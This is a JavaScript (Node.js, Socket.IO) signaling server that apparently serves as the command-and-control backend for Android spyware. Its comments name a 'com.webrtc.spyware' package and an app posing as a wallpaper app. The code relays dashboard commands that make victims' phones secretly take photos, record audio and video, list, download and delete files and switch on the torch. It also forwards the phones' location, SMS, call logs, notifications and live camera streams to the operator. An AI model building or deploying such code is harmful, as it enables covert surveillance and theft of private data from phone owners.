/**
 * WebRTC Signaling Server — Unified Protocol
 *
 * Handles BOTH signaling dialects:
 *   • Java path  (com.example.wallpaperapplication / StreamingService.java)
 *     Android emits : identify, signal  {to, from, signal:{type,sdp}} / {to,from,signal:{candidate}}
 *     Android listens: web-client-ready, signal, web-client-disconnected, start-stream
 *
 *   • Kotlin path (com.webrtc.spyware / SpywareService.kt + SocketManager.kt)
 *     Android emits : register-device {deviceId}
 *     Android listens: start-stream, capture-image, capture-audio, capture-video
 *
 *   • Dashboard (PHP index.php JS)
 *     Browser emits : join-as-controller {deviceId}, offer, answer, ice-candidate, signal,
 *                     capture-image, capture-audio, capture-video
 *     Browser listens: device-list-update, start-stream, offer, answer, ice-candidate,
 *                      signal, web-client-ready, media-ready, location, sms, call_log,
 *                      notification, fs:list_result, fs:download_start,
 *                      fs:download_chunk, fs:download_complete
 */

'use strict';

const express = require('express');
const http    = require('http');
const { Server } = require('socket.io');
const cors    = require('cors');

const app    = express();
const server = http.createServer(app);
const io     = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  pingTimeout:  60000,
  pingInterval: 25000
});

app.use(cors());
app.use(express.json());

app.get('/',       (_req, res) => res.json({ status: 'ok', version: '2.1.0', protocol: 'unified' }));
app.get('/health', (_req, res) => res.json({ status: 'ok', devices: Object.keys(deviceSockets).length }));

/**
 * State maps
 * deviceSockets : deviceId  -> socket.id   (Java path uses socket.id as deviceId fallback)
 * controllerOf  : socket.id -> deviceId    (which device this controller is watching)
 * socketType    : socket.id -> 'device' | 'controller'
 */
const deviceSockets = {};
const controllerOf  = {};
const socketType    = {};

// ─── Helper: broadcast updated device list to all controllers ─────────────────
function broadcastDeviceList() {
  io.emit('device-list-update', Object.keys(deviceSockets));
}

// ─── Helper: resolve controllerId for a device room ───────────────────────────
function controllerSocketId(deviceId) {
  for (const [sid, did] of Object.entries(controllerOf)) {
    if (did === deviceId) return sid;
  }
  return null;
}

io.on('connection', (socket) => {
  console.log(`[+] ${socket.id}`);

  // ──────────────────────────────────────────────────────────────────────────
  // Java path: Android identifies itself on connect
  // socket.emit('identify', 'android')  ← StreamingService.java
  // ──────────────────────────────────────────────────────────────────────────
  socket.on('identify', (type) => {
    if (type === 'android') {
      const deviceId = socket.id;          // Java path uses socket.id as deviceId
      deviceSockets[deviceId] = socket.id;
      socketType[socket.id]   = 'device';
      socket.join(`device_${deviceId}`);
      console.log(`[device:java] ${deviceId}`);
      broadcastDeviceList();
    }
  });

  // ──────────────────────────────────────────────────────────────────────────
  // Kotlin path: Android registers with explicit deviceId
  // socket.emit('register-device', { deviceId })  ← SpywareService.kt / SocketManager.kt
  // Also emitted by StreamingService.java for dual-compat
  // ──────────────────────────────────────────────────────────────────────────
  socket.on('register-device', (data) => {
    const deviceId = (data && data.deviceId) ? data.deviceId : socket.id;
    deviceSockets[deviceId] = socket.id;
    socketType[socket.id]   = 'device';
    socket.join(`device_${deviceId}`);
    console.log(`[device:reg] ${deviceId}`);
    broadcastDeviceList();
  });

  // ──────────────────────────────────────────────────────────────────────────
  // Dashboard: controller joins a device room
  // socket.emit('join-as-controller', { deviceId })
  // ──────────────────────────────────────────────────────────────────────────
  socket.on('join-as-controller', (data) => {
    const deviceId = data && data.deviceId;
    if (!deviceId) return;
    socketType[socket.id]    = 'controller';
    controllerOf[socket.id]  = deviceId;
    socket.join(`ctrl_${deviceId}`);
    console.log(`[ctrl] ${socket.id} → device ${deviceId}`);

    // Notify Java path Android (web-client-ready)
    io.to(`device_${deviceId}`).emit('web-client-ready', { webClientId: socket.id, deviceId });
    // Notify Kotlin path Android (start-stream)
    io.to(`device_${deviceId}`).emit('start-stream', { controllerId: socket.id, deviceId });
  });

  // ──────────────────────────────────────────────────────────────────────────
  // WebRTC Signaling — Java path
  // Android emits 'signal' { to, from, signal: { type:'offer'|'answer', sdp } }
  //                         { to, from, signal: { candidate:{...} } }
  // Dashboard also emits  'signal' for answer + ICE
  // ──────────────────────────────────────────────────────────────────────────
  socket.on('signal', (data) => {
    if (!data || !data.to) return;
    console.log(`[signal] ${socket.id} → ${data.to}`);
    // Route to target socket directly (works for both device rooms and controller ids)
    io.to(data.to).emit('signal', { ...data, from: socket.id });
  });

  // ──────────────────────────────────────────────────────────────────────────
  // WebRTC Signaling — Kotlin / legacy path
  // Android emits 'offer' { to, sdp } / Dashboard emits 'offer' { to, sdp }
  // ──────────────────────────────────────────────────────────────────────────
  socket.on('offer', (data) => {
    if (!data || !data.to) return;
    console.log(`[offer] ${socket.id} → ${data.to}`);
    io.to(data.to).emit('offer', { sdp: data.sdp, from: socket.id });
    // Also relay as unified 'signal' for Java-path receivers
    io.to(data.to).emit('signal', {
      to:     data.to,
      from:   socket.id,
      signal: { type: 'offer', sdp: data.sdp }
    });
  });

  socket.on('answer', (data) => {
    if (!data || !data.to) return;
    console.log(`[answer] ${socket.id} → ${data.to}`);
    io.to(data.to).emit('answer', { sdp: data.sdp, from: socket.id });
    io.to(data.to).emit('signal', {
      to:     data.to,
      from:   socket.id,
      signal: { type: 'answer', sdp: data.sdp }
    });
  });

  socket.on('ice-candidate', (data) => {
    if (!data || !data.to) return;
    io.to(data.to).emit('ice-candidate', { candidate: data.candidate, from: socket.id });
    io.to(data.to).emit('signal', {
      to:     data.to,
      from:   socket.id,
      signal: { candidate: data.candidate }
    });
  });

  // ──────────────────────────────────────────────────────────────────────────
  // Capture commands: Dashboard → Device
  // ──────────────────────────────────────────────────────────────────────────
  socket.on('capture-image', (data) => {
    const did = data && data.deviceId;
    if (!did) return;
    io.to(`device_${did}`).emit('capture-image', { camera: data.camera || 'front', deviceId: did });
  });

  socket.on('capture-audio', (data) => {
    const did = data && data.deviceId;
    if (!did) return;
    io.to(`device_${did}`).emit('capture-audio', { duration: data.duration || 10, deviceId: did });
  });

  socket.on('capture-video', (data) => {
    const did = data && data.deviceId;
    if (!did) return;
    io.to(`device_${did}`).emit('capture-video', { duration: data.duration || 15, camera: data.camera || 'back', deviceId: did });
  });

  // ──────────────────────────────────────────────────────────────────────────
  // Media captured: Device → Dashboard
  // ──────────────────────────────────────────────────────────────────────────
  socket.on('media-captured', (data) => {
    const did = data && data.deviceId;
    if (!did) return;
    io.to(`ctrl_${did}`).emit('media-ready', data);
  });

  // ──────────────────────────────────────────────────────────────────────────
  // Data streams: Device → Dashboard
  // location, sms, call_log, notification
  // ──────────────────────────────────────────────────────────────────────────
  socket.on('location', (data) => {
    const did = data && (data.deviceId || data.from);
    if (!did) return;
    io.to(`ctrl_${did}`).emit('location', data);
  });

  socket.on('sms', (data) => {
    const did = data && (data.deviceId || data.from);
    if (!did) return;
    io.to(`ctrl_${did}`).emit('sms', data);
  });

  socket.on('call_log', (data) => {
    const did = data && (data.deviceId || data.from);
    if (!did) return;
    io.to(`ctrl_${did}`).emit('call_log', data);
  });

  socket.on('notification', (data) => {
    const did = data && (data.deviceId || data.from);
    if (!did) return;
    io.to(`ctrl_${did}`).emit('notification', data);
  });

  // ──────────────────────────────────────────────────────────────────────────
  // File explorer relay: Dashboard ↔ Device
  // ──────────────────────────────────────────────────────────────────────────
  socket.on('fs:list', (data) => {
    const did = data && data.deviceId;
    if (!did) return;
    io.to(`device_${did}`).emit('fs:list', data);
  });

  socket.on('fs:list_result', (data) => {
    const to = data && data.to;
    if (!to) return;
    io.to(to).emit('fs:list_result', data);
  });

  socket.on('fs:download', (data) => {
    const did = data && data.deviceId;
    if (!did) return;
    io.to(`device_${did}`).emit('fs:download', data);
  });

  socket.on('fs:download_start',    (data) => { if (data && data.to) io.to(data.to).emit('fs:download_start',    data); });
  socket.on('fs:download_chunk',    (data) => { if (data && data.to) io.to(data.to).emit('fs:download_chunk',    data); });
  socket.on('fs:download_complete', (data) => { if (data && data.to) io.to(data.to).emit('fs:download_complete', data); });
  socket.on('fs:download_error',    (data) => { if (data && data.to) io.to(data.to).emit('fs:download_error',    data); });
  socket.on('fs:download_ready',    (data) => { if (data && data.deviceId) io.to(`device_${data.deviceId}`).emit('fs:download_ready', data); });

  socket.on('fs:delete', (data) => {
    const did = data && data.deviceId;
    if (!did) return;
    io.to(`device_${did}`).emit('fs:delete', data);
  });

  // ──────────────────────────────────────────────────────────────────────────
  // Torch / camera switch commands
  // ──────────────────────────────────────────────────────────────────────────
  socket.on('torch', (data) => {
    const did = data && data.deviceId;
    if (!did) return;
    io.to(`device_${did}`).emit('torch', { on: !!data.on });
  });

  socket.on('switch_camera', (data) => {
    const did = data && data.deviceId;
    if (!did) return;
    io.to(`device_${did}`).emit('switch_camera', {});
  });

  // ──────────────────────────────────────────────────────────────────────────
  // Disconnect: clean up device / controller maps
  // ──────────────────────────────────────────────────────────────────────────
  socket.on('disconnect', () => {
    console.log(`[-] ${socket.id}`);

    // Remove from deviceSockets if this was a device
    for (const [did, sid] of Object.entries(deviceSockets)) {
      if (sid === socket.id) {
        delete deviceSockets[did];
        // Notify any active controller for this device
        io.to(`ctrl_${did}`).emit('web-client-disconnected', { webClientId: socket.id, deviceId: did });
        broadcastDeviceList();
        break;
      }
    }

    // Remove from controllerOf if this was a controller
    const deviceId = controllerOf[socket.id];
    if (deviceId) {
      io.to(`device_${deviceId}`).emit('web-client-disconnected', { webClientId: socket.id, deviceId });
      delete controllerOf[socket.id];
    }

    delete socketType[socket.id];
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Unified signaling server on port ${PORT}`));
